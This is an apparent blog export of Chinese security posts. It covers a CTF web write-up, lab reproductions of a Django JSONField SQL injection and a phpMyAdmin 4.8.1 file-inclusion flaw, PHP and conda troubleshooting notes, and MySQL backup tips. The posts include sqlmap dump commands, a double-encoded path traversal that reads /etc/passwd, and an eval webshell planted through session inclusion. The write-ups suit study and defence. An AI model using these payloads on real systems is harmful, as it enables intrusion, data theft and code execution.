<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>WP-2020-i春秋公益赛</title>
    <url>/2020/02/21/Writeup/WP-2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h1><h2 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h2><p>打开就一个登陆注册，先想到sql注入</p>
<p>sqlmap 一把梭，时间盲注</p>
<p>request.txt</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">POST <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> <span class="number">49</span>a79616cf9b4a298fd6565dd2a47b9e677d5c1cefdf49bb.changame.ichunqiu.com</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">20</span></span><br><span class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></span><br><span class="line"><span class="string">Origin:</span> <span class="string">http:</span><span class="comment">//49a79616cf9b4a298fd6565dd2a47b9e677d5c1cefdf49bb.changame.ichunqiu.com</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">Content-<span class="string">Type:</span> application/x-www-form-urlencoded</span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/80.0.3987.116 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Referer:</span> <span class="string">http:</span><span class="comment">//49a79616cf9b4a298fd6565dd2a47b9e677d5c1cefdf49bb.changame.ichunqiu.com/</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> PHPSESSID=s3tiim20hpc0lf3mtg3n0i9c61; __jsluid_h=f3395e6f72d5b3e0a71bbcc240759bae</span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line"></span><br><span class="line">lname=user&amp;lpass=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"># 库</span><br><span class="line">python2 sqlmap.py  -r request.txt -dbms mysql -p <span class="string">"lname"</span> --<span class="built_in">time</span>-<span class="built_in">sec</span>=<span class="string">"1"</span> -current-<span class="built_in">db</span></span><br><span class="line"># 表</span><br><span class="line">python2 sqlmap.py  -r request.txt -dbms mysql -p <span class="string">"lname"</span> --<span class="built_in">time</span>-<span class="built_in">sec</span>=<span class="string">"1"</span> -v <span class="number">3</span> -D nzhaopin --tables</span><br><span class="line"># 列</span><br><span class="line">python2 sqlmap.py  -r request.txt -dbms mysql -p <span class="string">"lname"</span> --<span class="built_in">time</span>-<span class="built_in">sec</span>=<span class="string">"1"</span> -D nzhaopin -<span class="built_in">T</span> flag --<span class="built_in">columns</span></span><br><span class="line"># 字段</span><br><span class="line">python2 sqlmap.py  -r request.txt -dbms mysql -p <span class="string">"lname"</span> --<span class="built_in">time</span>-<span class="built_in">sec</span>=<span class="string">"1"</span> -D nzhaopin -<span class="built_in">T</span> flag -C flaaag --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://5enw4g.sn.files.1drv.com/y4mim2Sfjo7xjDB4GhMFfkD4fVBGjS_N8ncsWrjqzePToSGv_tAD-iXjzvewLcxusvCyiRUaVHOpMEfmiaFQGw4F4IlFXuwTm5SJT8xUL4K57Vw-kK2tsi836ApCVsuxzJ6jQfKccF7N28kspEzzkTHw8UwD36vn-u8SdXq3kBegvC-dsdjBd_mLtpPgqhB0-27Pz4xCjKPGDDNm3Ir6P3nEw?width=707&height=255&cropmode=none" alt></p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>传个小马直接读/readflag</p>
<p><img src="https://gf6yhq.sn.files.1drv.com/y4mJcvpfzkZjpcsLH-22gmYv5AftV4eDq9sKMIaJOOX4GjA1SAZWyaOfP2gtTi4EVr4P1eIUWEln7A7pSz_RRUngSp5t9MGRS0J0UwjvL1QXeRvMNGYvjUJdyiBi_Df_tFk-fHCVgq87Ebu8yNaZivn_F8ISSQAfe5Wq1Zx86vJvIszM6UhGBgvUJDKx8ccceOUIMluhQbey79aL9__pMiqgQ?width=722&height=264&cropmode=none" alt></p>
]]></content>
  </entry>
  <entry>
    <title>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</title>
    <url>/2019/11/17/CVE/Django-JSONField-HStoreField-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14234%EF%BC%89/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>抄p牛作业</p>
<p><a href="https://github.com/AbelChe/vulhub/tree/master/django/CVE-2019-14234" target="_blank" rel="noopener">https://github.com/AbelChe/vulhub/tree/master/django/CVE-2019-14234</a></p>
<h1 id="分析和复现"><a href="#分析和复现" class="headerlink" title="分析和复现"></a>分析和复现</h1><h2 id="Django-源码"><a href="#Django-源码" class="headerlink" title="Django 源码"></a>Django 源码</h2><p>2019年8月14日的更新<a href="https://github.com/django/django/commit/c19ad2da4b573431843e5cead77f4139e29c77a0" target="_blank" rel="noopener">https://github.com/django/django/commit/c19ad2da4b573431843e5cead77f4139e29c77a0</a><a id="more"></a></p>
<p><img src="https://qlqckq.sn.files.1drv.com/y4mXO6s6LxB-gMQbQWxG1JbmXe3UK_l4mgx2BVB9Ast42_-u9_Yq4xfjdbG9sC7baoxNi_205IirKYkrcsUqZZsfBNicB34Sq_NhzTB8ZwNTmTDVXXBHkypTihqUYWjv4_aaugj2gDgmBlZbxgp4OtgtlIbOcRp1b8XfCh6mW0TY6HAyHHtpsNyD1Vn1lwYdZNiUUP3HXtNv1dyXa1efJRGOw?width=966&height=1080&cropmode=none" alt></p>
<p><a href="https://github.com/django/django/blob/1f8382d34d54061eddc41df6994e20ee38c60907/tests/postgres_tests/test_json.py" target="_blank" rel="noopener">test_json.py</a> <code>TestQuerying.test_key_sql_injection()</code> 335~345行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_key_sql_injection</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">with</span> CaptureQueriesContext(connection) <span class="keyword">as</span> queries:</span><br><span class="line">           self.assertFalse(</span><br><span class="line">               JSONModel.objects.filter(**&#123;</span><br><span class="line">                   <span class="string">"""field__test' = '"a"') OR 1 = 1 OR ('d"""</span>: <span class="string">'x'</span>,</span><br><span class="line">               &#125;).exists()</span><br><span class="line">           )</span><br><span class="line">       self.assertIn(</span><br><span class="line">           <span class="string">"""."field" -&gt; 'test'' = ''"a"'') OR 1 = 1 OR (''d') = '"x"' """</span>,</span><br><span class="line">           queries[<span class="number">0</span>][<span class="string">'sql'</span>],</span><br><span class="line">       )</span><br></pre></td></tr></table></figure>

<h2 id="p牛环境的源码"><a href="#p牛环境的源码" class="headerlink" title="p牛环境的源码"></a>p牛环境的源码</h2><p>数据结构：</p>
<p><img src="https://cktvwq.sn.files.1drv.com/y4mMXfjYLbnWCZ2jbBzwOyitOTDtGcvPVnXW4hhSMl1IMbZ2tEvTXLGR55CD3AQ7klPQHKnc8JnIpXstYbY9UZNqcjOaJU0JppnGIh7ZS4GJY1NC-UhpLlC-bD68cJwDOw3llcTFRbhGM2I4B3KzlGTsL50HMV4eONsi7ZuBxBSZAOTe67CWumUuMlkroj4FsCBsthj2sw86c-yZeN21Oz4gg?width=510&height=584&cropmode=none" alt></p>
<p>models.py</p>
<p><img src="https://2qhmqq.sn.files.1drv.com/y4m7I2lJaEuAVkA_3OWd8TA2Vko8STvtVLnAZlQA2MI_rOh-Fip2KQwU3QoinCo3jeUce1w5LrSdqF65upOMPlca6DCa0RLMjEo32xy5mo_jaqBGcgFEoLUm_oJKH1fypjk1pxrbMQ7JzCNVmzuxJq9Pn-FsIqmg5Ri5lGeDCHkyhoWBuMiI98psiHwcRv85eTrdKRcO8Y0_n9JO9HW395vsg?width=567&height=241&cropmode=none" alt></p>
<p>数据迁移：</p>
<p><img src="https://mppzra.sn.files.1drv.com/y4mWsm3bnuVxrAiNQO4F2ZRyRhCCJdM9wQ37V1AVGvxHy_Hxl3yvy5vLdugNjzV9hAqYp9haGSKaiUjOFp85n_oJ4bTOfsqWvn5jj3iBJZdrc9wssPV2LzNVSY9A5_ql-4Tc9G0geCOnNJS1iBfZvfRoI8aEJz1P8TWwWSfiwHHga8989EjEpdp1ft_f_wnt02irV8QqV0gnCK241g2gFqaUQ?width=774&height=525&cropmode=none" alt></p>
<p>明显看到 JSONField() 的域名为 detail</p>
<p>结合这篇文章<a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">https://xz.aliyun.com/t/5896</a></p>
<p>参数<code>detail__title=vulhub</code></p>
<p>传到后端查询==&gt;<code>Collection.objects.filter(detail__author=&#39;vulhub&#39;)</code>或<code>Collection.objects.filter(**{&quot;detail__author&quot;:&#39;vulhub&#39;})</code></p>
<h2 id="测试注入点"><a href="#测试注入点" class="headerlink" title="测试注入点"></a>测试注入点</h2><p>payload：</p>
<p><code>/admin/vuln/collection/?detail__title&#39;=title%202</code></p>
<p><img src="https://rdrpna.sn.files.1drv.com/y4mMw4NNjicbyM2zTdogv2plBzYflDw-5bOMaqtPyCSqz_L9Rvgorj9lZOyPizrGcKwuipXCXsm9uGYfIC-7iYXgv5GLoWRQGVRo89zGj9PDeBR-dBhgb-LcWmACCll1s-b87q5Da90r2zCDUhKOa-L5sJmoqsiDdLIgGjRfFgGvG-Qk1Z-Zho5DpzF3X7sawJcP3d5KIafyMEFymxG6c1T3w?width=1020&height=589&cropmode=none" alt></p>
<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>payload：</p>
<p><code>admin/vuln/collection/?detail__title=title%202</code></p>
<p><img src="https://dhzzta.sn.files.1drv.com/y4miY9-IM0Pcug9UI2cbhkrVPYa6MmosCdlet0VoKRflPZZukVIPPMNHHTvxnUkLxVpjQQEy2FfAYSuLjAItleN-kj3R4g70Ui51prGqacAskm6crWTlsCO2SH6rCFkXAZseEoSm1-9ThwrqeoUKFbVosjRP0EX7H1aI5jv361-TLzc_yNBGfAgZqGkn7t-xlny-zIzEfloHRXfaCTtri1Tug?width=700&height=427&cropmode=none" alt></p>
<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">https://xz.aliyun.com/t/5896</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>django</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</title>
    <url>/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/</url>
    <content><![CDATA[<h1 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h1><p>phpmyadmin 4.8.{1,2}</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>自然是抄p牛的作业 vulhub</p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613</a></p>
<h1 id="分析和复现"><a href="#分析和复现" class="headerlink" title="分析和复现"></a>分析和复现</h1><p>漏洞源码：</p>
<p><code>sed -n &#39;55,63p&#39; index.php</code><a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])<span class="comment">//是否存在target参数</span></span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])<span class="comment">//target的值书否为字符串</span></span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])<span class="comment">//正则匹配是否以index开头</span></span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)<span class="comment">//在黑名单内的过滤掉</span></span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])<span class="comment">//Core类中的checkPageValidity方法</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sed -n &#39;50,53p&#39; index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (<span class="comment">//黑名单</span></span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><code>sed -n &#39;443,476p&#39; libraries/classes/Core.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">           $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $_page = mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $_page = urldecode($page);</span><br><span class="line">       $_page = mb_substr(</span><br><span class="line">           $_page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://q1pqkq.sn.files.1drv.com/y4mjHSVqAudEVlSCY-HYBvmQ16HMP9XIwrQhiFLrEkBR-hjacZqch8uRvtFL_kQhiyNDTnmiRnOidXCeSPmFsXztti16i70Q6dz5IOBS6bmvAVAkca1gGgJoBHMjCKXuBN-AUnzYhOx6_UFw8rVhedVs3VOg2MQYie59iJd5kK6fXbyzpfV0VVECl-tsaopDnUuPtH2tbH-nMSSyzvYSThspQ?width=478&height=422&cropmode=none" alt></p>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>payload:</p>
<p><code>index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></p>
<p>由于多了第二次的解码和判断，导致当传入二次编码的<code>?</code>（即<code>%253f</code>）时会取出导致db_sql.php作为参数从而绕过白名单进而达到文件读取的目的</p>
<p><img src="https://zhmptw.sn.files.1drv.com/y4m4N4c5vDOxv6X41W6iQmlMc09Te8-bZ7DEapVqbo3AgEmIUVi59ztFXaf9CcISxb8_cphE9NfyEJBPU-5NsDmWltkCJqrArVziXRaG-jsn9FbVBrvDA-bsEQK5fdxUDXN4BhXZjTakvEMjk521g7OCRcM5oTXWe8E_8BZE2qdsssEXaTR8XCAxGBF37orOxkHS691BYWM_LTs61Z4ITIvew?width=1814&height=199&cropmode=none" alt></p>
<p>那么既然能够文件读取，就可以利用 session 进行 php 代码执行（session 文件中中记录了执行的操作）</p>
<p>在<code>/server_sql.php</code>页面执行 sql <code>select &#39;&lt;?php phpinfo()?&gt;&#39;;</code></p>
<p><img src="https://mfpwra.sn.files.1drv.com/y4mwrsR2MkMB8oYpLmtaVRFRNiEIp6wcV1LgRFgRPrlWwJy4CoQc4XrEd-aowoi7nDZQ6P0SgTbMSAsg_gtnh_o8V924LYFjNDHkWVjCzk23N5yrneswgPAA92HyNmJN2iHwb4vhrT4SsjOchVSKZpC89IL3Wx54z17VGrjZ9wqVFf0u4sOs8DMfX_APOm_QIgkQa3JKKSUDH5xpcZ4II5TMQ?width=858&height=374&cropmode=none" alt></p>
<p>文件读取解析 php 代码</p>
<p><img src="https://pbh9za.sn.files.1drv.com/y4mZ-CVJXAxPJlrv1abKwTX8cK26CCsplJYLiRf5--8rKHgcm0TPNXoKqoo4zVK4FVRGuew9v90sHGQwbnP4FLUAjCzjw_8pn4Vq1RPzccdHEtgGBZYnCHdA2gk6PzutQ0KwXKna32KnCCM8PLToXaoVJ3eNfSN09lrTR0XvgGEWSJiqTxYApKiJJeAMVc-Z_HmjH9Drvu0IxFlZZp9_LHULg?width=1643&height=949&cropmode=none" alt></p>
<h2 id="getwebshell"><a href="#getwebshell" class="headerlink" title="getwebshell"></a>getwebshell</h2><p>payload：</p>
<p><code>select &#39;&lt;?php eval($_GET[&quot;x&quot;])?&gt;&#39;;</code></p>
<p><img src="https://mppwra.sn.files.1drv.com/y4mwHw-XsMrgOMuMz9HCZY-k5LV7l0w-wUOYFgyDVaR8GR8nGC_1j9mY9XfnHht54OFGl18t3bLv7_neHXHy-_6myWhsC13ng-5dAwukFcdHNB5og2p0Cu8NbZyt_EYT-yVlFCXqA-wfpOsWIufBZoG4amf3IU_O745VpllMGgzb74oNa8peLBKOb1ppL9794N9Esz1IWlIvyKkB5uVKI4IBQ?width=844&height=212&cropmode=none" alt></p>
<p><img src="https://y3mptw.sn.files.1drv.com/y4mG8YyJXkjkkOIOhLhWK46_nuTnzqAApDloEtIwpD8zMxPJYwsuGTUM4od264RcIjddFZ4zLm8AbyY98Ir_8zDbjDhGXJV3Bp5T57RnST4owxlEZa_BctikzJe4O_3JB6y4rMoNKJ9BKwwZRHiEa8uTmKUZ1Dx3flUJVCVuflE5RgtEkTQAk0mr8g9PTUoTgD-IVhoZBCt1pv7oTJkKScKkw?width=1532&height=719&cropmode=none" alt></p>
<p>参考文章：</p>
<p><a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">https://www.jianshu.com/p/0d75017c154f</a></p>
<p><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>大菜鸡的填坑日记</title>
    <url>/2019/11/04/%E5%A4%A7%E8%8F%9C%E9%B8%A1%E7%9A%84%E5%A1%AB%E5%9D%91%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<p>欸？咋又一个坑？？？？！</p>
<img src="https://truth.bahamut.com.tw/s01/201210/ca1ff160d52dc33f71698ec2211a7a6a.JPG" style="zoom:40%;">

<a id="more"></a>

<h1 id="LAMP-环境下-php-的-session-无法保存，无法读取"><a href="#LAMP-环境下-php-的-session-无法保存，无法读取" class="headerlink" title="LAMP 环境下 php 的 session 无法保存，无法读取"></a>LAMP 环境下 php 的 session 无法保存，无法读取</h1><ul>
<li><p>更新时间</p>
<ul>
<li>2019-11-04</li>
</ul>
</li>
<li><p>相关环境</p>
<ul>
<li>centos 7</li>
<li>PHP 7.1.22</li>
</ul>
</li>
<li><p>坑の描述</p>
<blockquote>
<p>项目登陆功能使用到session，但是session无法生成，<code>session_start();</code>执行后没有生成 session 文件。</p>
<ul>
<li>php.ini配置</li>
</ul>
<p><img src="https://prhpha.sn.files.1drv.com/y4mMLFaKr__JB8WHbjPq_hKbDeAiqod3sxuu8OBpVZi7rqzgnt_Sj4X4pjs5atTwynhuRp8IvckL8ONWyyXUeTtZd_VDsu1PX-4U5X6PLE1HyKcRiRoZlQpA31vMdGWgedX1AKFaM9K8FUImxBj56wiZFi6lrsFhOK3PD-had7Jlb4R91NOp5T3xON1eDR4mp2KGjxG_eR0B_mmCGuJaFv3AQ?width=673&height=148&cropmode=none" alt></p>
<ul>
<li>成功执行到<code>session_start()</code></li>
</ul>
<p><img src="https://zxmqbw.sn.files.1drv.com/y4mTcdMyXY1Fr6Ue7bjtzJIe0AUXq3CGTHQerodv-ZyLfK51S59qelf0y6fN9nO9tRa11qSLXpA9eCG41GXGLaWttq6Am1A8t-TPg0bARrJshqRHeVLU1xEHPBHhVJRnX3dh0FuQB15qLjl2sFW3wdZ8efIOxmyczMmSa2YckmAAmC-HlY71eyARuz8FmlGuV8g2BeoscDz9cvUxL_uRdJk3g?width=510&height=295&cropmode=none" alt></p>
<ul>
<li>没有 session 文件</li>
</ul>
<p><img src="https://mvpcza.sn.files.1drv.com/y4mmiP_vk8jGH2CeQNG-xgll8uiY1pIqAajgxStHYA4r3yA9UY7O3okICCUM7ioM5rYR2ZuKbfmJZvZR-ctIjzo93C1osNc5SUTLUUrh-KySB6S_ohjNeg9BBjv4i06z71C3xysYDKnTt19wVkkUuLX1Ahd3qmlv8FOCOwGxxQCCNuDRqdVQ_8LaeoHeD5n12ryqRqYOX1RqbUEvVi90B9uxg?width=335&height=79&cropmode=none" alt></p>
</blockquote>
</li>
<li><p>填坑</p>
<ol>
<li><p>linux上的环境，出了问题猜测是权限的问题，查看下<code>/var/lib/php/session</code>的文件夹权限</p>
<p><img src="https://cqtb4q.sn.files.1drv.com/y4mvj6fUPDrmALj7gG4RzZ1WqB8whVIcKqz6zmOjg3AbwSEqUjC7o4TnY3Ed3pwryFqwb-yb3xLCxCMHuqoI2ZnEf6i1WFXgb5bHebS3nk_jzi_wXcEa9T-c974GNYfnVyXdZ2NX_C0OTj2rvU6oCLMnT65uMJB2WmJoe9oziMO8nWSkqY4UZJeF7_nXNL6Xn921UlmABg2qheRZPAzC4iSwQ?width=475&height=121&cropmode=none" alt></p>
</li>
<li><p>想到前阵为了测试修改了 apache 的启动用户</p>
</li>
<li><p>于是将 apache 的启动用户修改回 apache，重启服务后问题解决</p>
<p><img src="https://2wg4yq.sn.files.1drv.com/y4mNaY6-yuaxeVFGI2I7FYoUjQiPnZmwpdSFpw6wz7anlJNA7evkcp_b-KjTyrDpig2acbaWsNEDvP1KnyEX-mAhyyqNSat4X0nC3G8kgXgpJCAETFJzuFGUORBPImLflaXdlcVXO-s38sgW8UrVvJPLwYX79bY9e81nLLWVomdDr3883EOWxQ-LngZzEHC_7DzMNDYi9RXFSkBWVMIRkOe5Q?width=659&height=175&cropmode=none" alt></p>
</li>
</ol>
</li>
</ul>
<h1 id="php-读取不到-tmp-目录下文件"><a href="#php-读取不到-tmp-目录下文件" class="headerlink" title="php 读取不到 /tmp/ 目录下文件"></a>php 读取不到 /tmp/ 目录下文件</h1><ul>
<li>更新时间<ul>
<li>2019-12-16</li>
</ul>
</li>
<li>相关环境<ul>
<li>centos8</li>
<li>php</li>
<li>apache</li>
</ul>
</li>
<li>坑の描述<ul>
<li>想用 php 读取 /tmp/ 下的文件，结果读取不到</li>
</ul>
</li>
<li>填坑<ul>
<li>systemd 服务会将的 /tmp/ 目录重定向到另外一个目录</li>
<li>修改 /lib/systemd/system/httpd.service 下相关服务的配置文件</li>
<li>PrivateTmp属性为false时，tmp目录不做映射，为true，会将tmp映射到一个新的目录</li>
</ul>
</li>
<li>参考文章<ul>
<li><a href="https://blog.csdn.net/esion23011/article/details/77885692" target="_blank" rel="noopener">https://blog.csdn.net/esion23011/article/details/77885692</a></li>
</ul>
</li>
</ul>
<h1 id="zsh无法使用conda相关命令"><a href="#zsh无法使用conda相关命令" class="headerlink" title="zsh无法使用conda相关命令"></a>zsh无法使用conda相关命令</h1><ul>
<li><p>更新时间</p>
<ul>
<li>2020-02-25</li>
</ul>
</li>
<li><p>相关环境</p>
<ul>
<li>zsh</li>
<li>Anaconda3（之前在bash环境下安装成功）</li>
</ul>
</li>
<li><p>坑の描述</p>
<blockquote>
<p>安装使用zsh后发现原来在bash下能正常使用的Anaconda无法使用了</p>
</blockquote>
</li>
<li><p>填坑</p>
<ul>
<li><p>猜测是环境变量的问题，于是查看bashrc里关于Anaconda的设置，找到后复制到zshrc中</p>
</li>
<li><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">__conda_setup=<span class="string">"<span class="variable">$('/usr/local/anaconda3/bin/conda' 'shell.bash' 'hook' 2&gt; /dev/null)</span>"</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0  ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">eval</span> <span class="string">"<span class="variable">$__conda_setup</span>"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">"/usr/local/anaconda3/etc/profile.d/conda.sh"</span>  ]; <span class="keyword">then</span></span><br><span class="line">        . <span class="string">"/usr/local/anaconda3/etc/profile.d/conda.sh"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">export</span> PATH=<span class="string">"/usr/local/anaconda3/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> __conda_setup</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h1 id="Anaconda创建虚拟环境后没有bin"><a href="#Anaconda创建虚拟环境后没有bin" class="headerlink" title="Anaconda创建虚拟环境后没有bin"></a>Anaconda创建虚拟环境后没有bin</h1><ul>
<li><p>更新时间</p>
<ul>
<li>2020-02-25</li>
</ul>
</li>
<li><p>相关环境</p>
<ul>
<li>ubuntu18</li>
<li>Anaconda3</li>
</ul>
</li>
<li><p>坑の描述</p>
<blockquote>
<p>使用Anaconda3创建python虚拟环境后没有python解释器</p>
<p><code>conda create -n envname</code></p>
</blockquote>
</li>
<li><p>填坑</p>
<ul>
<li>创建的时候需要指定python(版本)，若不指定则会创建一个空的环境</li>
<li><code>conda create -n envname python</code>(使用默认版本)</li>
<li><code>conda create -n envname python=3.7</code>(指定版本)</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>坑</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN刷题记录-Bugku</title>
    <url>/2019/10/08/PWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8/PWN%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-Bugku/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>AWD中舒服的姿势</title>
    <url>/2019/10/08/AWD%E4%B8%AD%E8%88%92%E6%9C%8D%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><ul>
<li>方法一</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /var/lib/mysql</span></span><br><span class="line"><span class="comment"># mysqldump -uroot -p [库名] &gt; back.sql</span></span><br></pre></td></tr></table></figure>

<ul>
<li>方法二</li>
</ul>
<a id="more"></a>

<p>使用 navicat 等图形化工具连接，傻瓜化操作</p>
<h2 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h2><ul>
<li>方法一</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先进入数据库查看库是否存在，不存在就创建</span></span><br><span class="line"><span class="comment"># mysql -uroot -p</span></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; create database [库名];</span><br><span class="line">mysql&gt; use [库名];</span><br><span class="line">mysql&gt; <span class="built_in">source</span> back.sql;</span><br></pre></td></tr></table></figure>

<ul>
<li>方法二</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先进数据库查看库是否存在，不存在就创建</span></span><br><span class="line"><span class="comment"># mysql -uroot -p [库名] &lt; back.sql</span></span><br></pre></td></tr></table></figure>

<ul>
<li>方法三</li>
</ul>
<p>使用 navicat 等图形化管理工具，傻瓜化操作</p>
